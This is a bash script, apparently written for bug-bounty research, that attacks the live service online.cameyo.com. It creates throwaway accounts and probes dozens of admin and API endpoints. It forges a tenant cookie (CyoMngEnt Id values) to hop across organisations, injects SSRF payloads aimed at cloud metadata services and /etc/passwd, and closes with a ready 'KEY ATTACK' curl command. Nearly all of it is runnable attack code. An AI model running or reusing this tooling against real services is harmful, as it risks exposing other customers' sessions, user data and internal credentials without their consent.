#!/usr/bin/env bash
# cameyo-authenticated-idor.sh
# Phase 4 deep-dive on online.cameyo.com — TIER0, Google VRP.
#
# Attack surface confirmed from Phase 3:
#   - /command?op=<operation> — ASP.NET WebForms API (only SkinCss accessible unauth)
#   - /console — leaks admin nav structure (Servers, Users, Policy, Session settings)
#   - CyoMngEnt cookie: "Id=<id>&Name=<name>" controls active management entity
#   - /setup /register both return 200 (SPA shell)
#
# This script:
#   1. Registers a test account to get an authenticated session
#   2. Probes ALL /command?op= operations with the session
#   3. Tests IDOR by iterating CyoMngEnt Id values (org/tenant hopping)
#   4. Probes /api/v1/* endpoints for real data (not SPA shell)
#   5. Tests CyoMngEnt cookie forge with Id=0, Id=1, Id=admin
#
# Run from Pi: bash scripts/cameyo-authenticated-idor.sh
# Or with existing session: SESSION_COOKIE="<cookie>" bash scripts/cameyo-authenticated-idor.sh
set -euo pipefail

OUT="results/cameyo.com"
EVIDENCE="$OUT/evidence/phase4-idor"
mkdir -p "$EVIDENCE"

UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
BASE="https://online.cameyo.com"
TIMESTAMP=$(date +%Y%m%d-%H%M%S)

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'
hit()    { echo -e "${RED}[CRITICAL HIT]${NC} $*"; }
ok()     { echo -e "${GREEN}[OK]${NC} $*"; }
info()   { echo -e "${CYAN}[*]${NC} $*"; }
warn()   { echo -e "${YELLOW}[?]${NC} $*"; }
finding(){ echo -e "${RED}[FINDING]${NC} $*" | tee -a "$EVIDENCE/findings.txt"; }

echo ""
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  Cameyo Authenticated IDOR Hunt — TIER0, Google VRP      ${NC}"
echo -e "${CYAN}  Target: online.cameyo.com                               ${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo ""

# ─── Phase 0: Cookie jar setup ───────────────────────────────────────────────
COOKIE_JAR="$EVIDENCE/cookies-$TIMESTAMP.txt"
AUTH_HEADERS="-H \"User-Agent: $UA\""

# Use provided session or register new one
if [ -n "${SESSION_COOKIE:-}" ]; then
  info "Using provided session cookie: ${SESSION_COOKIE:0:40}..."
  AUTH_COOKIE="$SESSION_COOKIE"
else
  info "No SESSION_COOKIE provided — attempting account registration"
  echo ""

  # ─── Step 1: Fetch registration form + CSRF token ─────────────────────────
  info "Step 1: Fetching registration form"
  REG_PAGE=$(curl -sk -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
    -H "User-Agent: $UA" "$BASE/register" 2>/dev/null)
  echo "$REG_PAGE" > "$EVIDENCE/register-page.html"

  # Extract any hidden form fields (CSRF tokens, ViewState)
  CSRF=$(echo "$REG_PAGE" | grep -oiE 'name="__RequestVerificationToken"[^>]*value="([^"]+)"' | grep -oE 'value="([^"]+)"' | tr -d 'value="' | head -1 || true)
  VIEWSTATE=$(echo "$REG_PAGE" | grep -oE 'id="__VIEWSTATE"[^>]*value="([^"]{1,100})' | grep -oE 'value="[^"]+"' | tr -d 'value="' | head -1 || true)
  echo "  CSRF token: ${CSRF:0:40}${CSRF:+...}"
  echo "  ViewState: ${VIEWSTATE:0:40}${VIEWSTATE:+...}"

  # Check for sign-up form fields
  echo "  Form fields found:"
  echo "$REG_PAGE" | grep -oiE '<(input|button|select)[^>]+>' | head -20

  # ─── Step 2: Try registration via API (look for /api/ or /command?op=Register endpoints)
  info "Step 2: Probing registration API endpoints"
  TEST_EMAIL="sec-research-${TIMESTAMP}@mailinator.com"
  TEST_PASS="Sectest123!"
  TEST_COMPANY="SecResearch${TIMESTAMP}"

  # Try JSON API registration first
  for REG_EP in "/api/register" "/api/v1/register" "/api/account/register" \
                "/command?op=Register" "/command?op=CreateAccount" \
                "/command?op=SignUp" "/api/v1/accounts" "/api/signup"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
      -X POST -H "Content-Type: application/json" -H "User-Agent: $UA" \
      -d "{\"email\":\"$TEST_EMAIL\",\"password\":\"$TEST_PASS\",\"company\":\"$TEST_COMPANY\"}" \
      "$BASE$REG_EP" 2>/dev/null)
    echo "  POST $REG_EP (JSON) → HTTP $CODE"
    if [ "$CODE" = "200" ] || [ "$CODE" = "201" ] || [ "$CODE" = "302" ]; then
      BODY=$(curl -sk -c "$COOKIE_JAR" \
        -X POST -H "Content-Type: application/json" -H "User-Agent: $UA" \
        -d "{\"email\":\"$TEST_EMAIL\",\"password\":\"$TEST_PASS\",\"company\":\"$TEST_COMPANY\"}" \
        "$BASE$REG_EP" 2>/dev/null | head -c 500)
      echo "  Response: $BODY"
      echo "$BODY" >> "$EVIDENCE/registration-response.txt"
    fi
  done

  # Try form POST registration
  info "Step 2b: Form POST registration"
  for REG_EP in "/register" "/signup" "/account/register" "/api/register"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
      -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: $UA" \
      -d "email=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$TEST_EMAIL'))")&password=$TEST_PASS&company=$TEST_COMPANY${CSRF:+&__RequestVerificationToken=$CSRF}" \
      -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
      "$BASE$REG_EP" 2>/dev/null)
    echo "  POST $REG_EP (form) → HTTP $CODE"
    if [ "$CODE" != "404" ] && [ "$CODE" != "405" ]; then
      BODY=$(curl -sk -X POST -H "Content-Type: application/x-www-form-urlencoded" \
        -H "User-Agent: $UA" \
        -d "email=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$TEST_EMAIL'))")&password=$TEST_PASS&company=$TEST_COMPANY" \
        -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
        "$BASE$REG_EP" 2>/dev/null | head -c 500)
      echo "  Body: $BODY"
    fi
  done

  # ─── Step 3: Attempt login with test account
  info "Step 3: Login attempt"
  for LOGIN_EP in "/command?op=Login" "/api/login" "/api/v1/login" "/login" "/api/auth"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
      -X POST -H "Content-Type: application/json" -H "User-Agent: $UA" \
      -d "{\"username\":\"$TEST_EMAIL\",\"password\":\"$TEST_PASS\"}" \
      -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
      "$BASE$LOGIN_EP" 2>/dev/null)
    echo "  POST $LOGIN_EP → HTTP $CODE"
    if [ "$CODE" = "200" ] || [ "$CODE" = "302" ]; then
      BODY=$(curl -sk \
        -X POST -H "Content-Type: application/json" -H "User-Agent: $UA" \
        -d "{\"username\":\"$TEST_EMAIL\",\"password\":\"$TEST_PASS\"}" \
        -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
        "$BASE$LOGIN_EP" 2>/dev/null | head -c 500)
      echo "  Body: $BODY"
      if echo "$BODY" | grep -qiE "token|session|success|user"; then
        ok "Possible login response at $LOGIN_EP"
        echo "$BODY" >> "$EVIDENCE/login-response.txt"
      fi
    fi
  done

  AUTH_COOKIE=$(grep -oE '\S+\s+\S+$' "$COOKIE_JAR" 2>/dev/null | tail -1 || echo "")
  info "Session cookie after reg/login: ${AUTH_COOKIE:0:60}"
fi
echo ""

# ─── Phase 1: Command API enumeration with auth ───────────────────────────────
info "Phase 1: /command?op= API enumeration (authenticated + unauthenticated)"
echo ""

ALL_OPS=(
  "GetSessions" "GetUsers" "GetApps" "GetAdmins" "GetSettings" "GetOrgs"
  "GetOrganizations" "GetTenants" "GetOrg" "GetAllUsers" "GetAllSessions"
  "GetLicense" "GetStats" "GetServerStats" "GetConfig" "GetInstances"
  "GetSystemInfo" "GetSystemStatus" "GetBackup" "GetBackups"
  "GetKeys" "GetAPIKeys" "GetGroups" "GetRoles" "GetPermissions"
  "GetAuditLog" "GetLogs" "GetEvents" "GetReports"
  "SkinCss" "GetVersion" "GetStatus" "GetHealth"
  "ListUsers" "ListSessions" "ListApps" "ListOrgs" "ListGroups"
  "EnumUsers" "EnumSessions" "SearchUsers" "ExportUsers"
  "AdminGetUsers" "AdminListSessions" "AdminGetConfig"
  "SetUser" "DeleteUser" "UpdateUser" "CreateUser"
  "GetUserInfo" "GetProfile" "GetAccount"
)

echo "--- Unauthenticated command probes ---" | tee -a "$EVIDENCE/command-api-results.txt"
for OP in "${ALL_OPS[@]}"; do
  RESP=$(curl -sk --max-time 8 -H "User-Agent: $UA" \
    "$BASE/command?op=$OP" 2>/dev/null)
  LEN=${#RESP}
  if [ "$LEN" -gt 0 ]; then
    echo "  op=$OP → len=$LEN: $(echo "$RESP" | head -c 120)"
    echo "op=$OP len=$LEN: $(echo "$RESP" | head -c 120)" >> "$EVIDENCE/command-api-results.txt"
    if echo "$RESP" | grep -qiE "user|session|email|admin|tenant|org|name|id[^e]"; then
      finding "Data leak via /command?op=$OP (unauthenticated)"
      echo "$RESP" > "$EVIDENCE/op-${OP}-unauth-data.txt"
    fi
  fi
done
echo ""

# ─── Phase 2: CyoMngEnt IDOR — Org/Tenant hopping ───────────────────────────
info "Phase 2: CyoMngEnt cookie IDOR test — tenant/org ID enumeration"
echo ""
echo "  CyoMngEnt cookie format: Id=<id>&Name=<name>"
echo "  Hypothesis: setting arbitrary Id values accesses other organizations"
echo ""

echo "--- CyoMngEnt IDOR probes ---" | tee -a "$EVIDENCE/cyomngent-idor.txt"

# Test forged entity cookies with GetSessions and GetUsers
for ID in 0 1 2 3 4 5 10 100 999 1000; do
  FORGED_COOKIE="CyoMngEnt=Id=${ID}&Name=TestOrg"
  for OP in "GetSessions" "GetUsers" "GetApps" "GetAdmins" "GetOrgs" "GetSettings"; do
    RESP=$(curl -sk --max-time 8 -H "User-Agent: $UA" \
      -H "Cookie: $FORGED_COOKIE" \
      "$BASE/command?op=$OP" 2>/dev/null)
    LEN=${#RESP}
    if [ "$LEN" -gt 5 ]; then
      echo "  [Id=$ID] op=$OP → len=$LEN: $(echo "$RESP" | head -c 150)"
      echo "[Id=$ID] op=$OP len=$LEN: $(echo "$RESP" | head -c 150)" >> "$EVIDENCE/cyomngent-idor.txt"
      if echo "$RESP" | grep -qiE "user|session|email|admin|tenant|org|name"; then
        finding "IDOR: CyoMngEnt Id=$ID exposes data via op=$OP"
        echo "$RESP" > "$EVIDENCE/idor-id${ID}-op${OP}.txt"
      fi
    fi
  done
done
echo ""

# ─── Phase 3: /api/v1/* endpoint probing (not SPA shell) ─────────────────────
info "Phase 3: /api/v1/* real API discovery"
echo ""
echo "--- /api/v1 endpoint probes ---" | tee -a "$EVIDENCE/api-v1-results.txt"

API_PATHS=(
  "/api/v1/users" "/api/v1/sessions" "/api/v1/apps" "/api/v1/organizations"
  "/api/v1/tenants" "/api/v1/admin" "/api/v1/admin/users" "/api/v1/admin/sessions"
  "/api/v1/settings" "/api/v1/config" "/api/v1/license" "/api/v1/stats"
  "/api/v1/accounts" "/api/v1/groups" "/api/v1/roles" "/api/v1/events"
  "/api/v1/audit" "/api/v1/logs" "/api/v1/servers" "/api/v1/instances"
  "/api/v1/keys" "/api/v1/apikeys" "/api/v1/me" "/api/v1/profile"
  "/api/v1/whoami" "/api/v1/status" "/api/v1/health" "/api/v1/version"
  "/api/v2/users" "/api/v2/sessions" "/api/v2/organizations"
  "/api/users" "/api/sessions" "/api/admin" "/api/config"
)

for EP in "${API_PATHS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
    -H "User-Agent: $UA" -H "Accept: application/json" \
    "$BASE$EP" 2>/dev/null)
  if [ "$CODE" = "200" ] || [ "$CODE" = "201" ]; then
    BODY=$(curl -sk --max-time 8 -H "User-Agent: $UA" \
      -H "Accept: application/json" "$BASE$EP" 2>/dev/null)
    LEN=${#BODY}
    IS_HTML=$(echo "$BODY" | grep -ci "<!DOCTYPE\|<html" || true)
    echo -n "  $EP → HTTP $CODE len=$LEN"
    if [ "$IS_HTML" -gt 0 ]; then
      echo " (SPA shell — skip)"
    else
      echo " ← REAL JSON RESPONSE"
      echo "$BODY" | head -c 300
      echo "$BODY" > "$EVIDENCE/api-real-${EP//\//-}.txt"
      if echo "$BODY" | grep -qiE "user|session|email|admin|org|tenant"; then
        finding "Real API data at $EP (unauthenticated)"
      fi
    fi
  else
    echo "  $EP → HTTP $CODE"
  fi
  echo "$EP HTTP $CODE" >> "$EVIDENCE/api-v1-results.txt"
done
echo ""

# ─── Phase 4: SkinCss parameter injection ────────────────────────────────────
info "Phase 4: SkinCss endpoint parameter injection (SSRF vector)"
echo ""
# SkinCss returns CSS unauthenticated — check if it accepts URL/path params
for PARAM in "?url=" "?src=" "?path=" "?file=" "?resource=" "?theme=" "?skin=" \
             "&url=" "&src=" "&file=" "&entityId=" "&esn=" "&org="; do
  for VAL in "http://169.254.169.254/latest/meta-data/" \
             "http://metadata.google.internal/computeMetadata/v1/" \
             "/etc/passwd" "file:///etc/passwd"; do
    RESP=$(curl -sk --max-time 8 -H "User-Agent: $UA" \
      "$BASE/command?op=SkinCss${PARAM}$(python3 -c "import urllib.parse; print(urllib.parse.quote('$VAL'))")" \
      2>/dev/null | head -c 300)
    if echo "$RESP" | grep -qiE "root:|ami-id|instance-id|google|computeMetadata"; then
      finding "SSRF via SkinCss param ${PARAM}: $VAL"
      echo "$RESP" > "$EVIDENCE/skincss-ssrf-${PARAM//[=&\/]/-}.txt"
    fi
  done
done
echo ""

# ─── Phase 5: /console with direct API calls ─────────────────────────────────
info "Phase 5: /console admin endpoint deep probe"
echo ""
CONSOLE_RESP=$(curl -sk --max-time 10 -H "User-Agent: $UA" "$BASE/console" 2>/dev/null)
echo "$CONSOLE_RESP" | grep -oiE '(ajax|fetch|xmlhttp|href|action)=[^>]+' | head -20 | tee "$EVIDENCE/console-links.txt"
# Look for hardcoded API calls in script blocks
echo "$CONSOLE_RESP" | grep -oiE "/(command|api)[^'\"<> ]*" | sort -u | head -30 | tee -a "$EVIDENCE/console-links.txt"
echo ""

# ─── Phase 6: Server-Sent Events / WebSocket probe ───────────────────────────
info "Phase 6: SSE / WebSocket endpoints (real-time session feeds)"
echo ""
for SSE_EP in "/sse" "/events" "/stream" "/notify" "/ws" "/realtime" \
              "/command?op=Stream" "/command?op=Subscribe" "/command?op=Events"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
    -H "User-Agent: $UA" -H "Accept: text/event-stream" \
    "$BASE$SSE_EP" 2>/dev/null)
  [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "  $SSE_EP → HTTP $CODE"
done
echo ""

# ─── Summary ─────────────────────────────────────────────────────────────────
echo -e "${CYAN}═══ Cameyo Phase 4 Summary ═══${NC}"
echo "  Evidence: $EVIDENCE/"
echo ""
if [ -s "$EVIDENCE/findings.txt" ]; then
  hit "FINDINGS:"
  cat "$EVIDENCE/findings.txt"
else
  echo "  No confirmed findings yet."
  echo ""
  echo "  Next manual steps:"
  echo "  1. Register account at https://online.cameyo.com/register (in browser)"
  echo "  2. Extract cookies from browser DevTools → Network → Cookie header"
  echo "  3. Re-run: SESSION_COOKIE='<cookie_string>' bash scripts/cameyo-authenticated-idor.sh"
  echo "  4. With authenticated session, test op=GetSessions with forged CyoMngEnt Id values"
fi
echo ""
echo "  KEY ATTACK: Try forged CyoMngEnt cookies on authenticated GetSessions:"
echo "  curl -sk -H 'Cookie: <your-session>; CyoMngEnt=Id=1&Name=SomeOrg' \\"
echo "    'https://online.cameyo.com/command?op=GetSessions'"
echo "  → If returns other tenants' sessions: CRITICAL cross-tenant IDOR"
